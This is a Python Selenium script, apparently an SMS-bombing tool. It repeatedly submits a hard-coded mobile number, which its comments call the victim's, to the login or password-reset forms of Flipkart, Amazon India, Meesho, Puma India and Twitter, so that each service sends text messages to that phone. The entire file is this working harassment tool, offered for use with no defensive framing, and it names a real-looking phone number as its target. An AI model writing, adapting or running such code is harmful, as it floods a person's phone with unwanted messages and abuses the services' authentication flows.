from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Create an instance of Chrome webdriver
browser = webdriver.Chrome()

# Set the frequency of SMS, approximately 10 per 24 days
frequency = 5

# Target mobile number, change it to victim's number and
# ensure that it's registered on Flipkart
mobile_number = "9952633677"

# Initialize WebDriverWait with a timeout of 10 seconds
wait = WebDriverWait(browser, 10)

for i in range(frequency):
    browser.get('https://www.flipkart.com/account/login?ret=%2Faccount%2F%3Frd%3D0%26link%3Dhome_account')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[3]/button')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS
    time.sleep(2)

# Close the browser
browser.quit()

browser = webdriver.Chrome()

frequency = 5

mobile_number = "9952633677"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://www.amazon.in/ap/forgotpassword?openid.pape.max_auth_age=900&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='//*[@id="ap_email"]')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="continue"]')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS
    time.sleep(2)

# Close the browser
browser.quit()


# meesho

browser = webdriver.Chrome()

frequency = 10

mobile_number = "9952633677"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://www.meesho.com/auth?redirect=https%3A%2F%2Fwww.meesho.com%2F&source=profile&entry=header&screen=HP')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='/html/body/div/div[4]/div/div[2]/div/div/div[2]/input')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div[4]/div/div[2]/div/button/div')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS
    time.sleep(2)

# Close the browser
browser.quit()


#puma

browser = webdriver.Chrome()

frequency = 10

mobile_number = "9952633677"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://in.puma.com/in/en/account/login?action=login&gclid=Cj0KCQjwk96lBhDHARIsAEKO4xZwHUtvX1RdBaAOszK2jw13zZRIjfBK5hTFjyOMoLugsw5Jrm7R8VYaAufjEALw_wcB&utm_aud=OTH&utm_campaign=BS_GGL_IN_BS_GGL_SEA_TXT_Brand-Exact_agency_1000067495857508873&utm_medium=BS&utm_obj=OLC&utm_source=GGL-SEA')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='//*[@id="phoneNo"]')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="login-submit"]')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS
    time.sleep(2)

# Close the browser
browser.quit()



#twitter

browser = webdriver.Chrome()

frequency = 10

mobile_number = "9952633677"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://twitter.com/i/flow/login?redirect_after_login=%2F%3Flogout%3D1689768318232')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='/html/body/div/div/div/div[1]/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div/div/div/div[5]/label/div/div[2]/div/input')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div/div/div[1]/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div/div/div/div[6]/div')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS
    time.sleep(2)

# Close the browser
browser.quit()





